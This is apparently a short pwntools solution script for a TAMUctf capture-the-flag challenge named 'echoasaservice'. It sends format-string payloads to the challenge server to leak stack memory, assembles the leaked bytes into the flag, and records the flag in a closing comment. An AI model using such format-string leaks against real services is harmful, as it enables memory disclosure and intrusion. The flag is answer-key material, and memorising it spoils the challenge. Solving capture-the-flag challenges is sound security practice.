from pwn import *


# context.log_level = 'DEBUG'


binpath = './echoasaservice'
elf = ELF(binpath)

# io = process(binpath)
io = remote('challenges.tamuctf.com', 4251)

flag = b''
for i in range(4):
    io.recvline()
    fmt = b'%' + b'%d' % (8 + i) + b'$p'
    io.sendline(fmt)
    data = io.recvline().rstrip()
    flag += p64(int(data, 16))
    print(flag)

# gigem{3asy_f0rmat_vuln1}
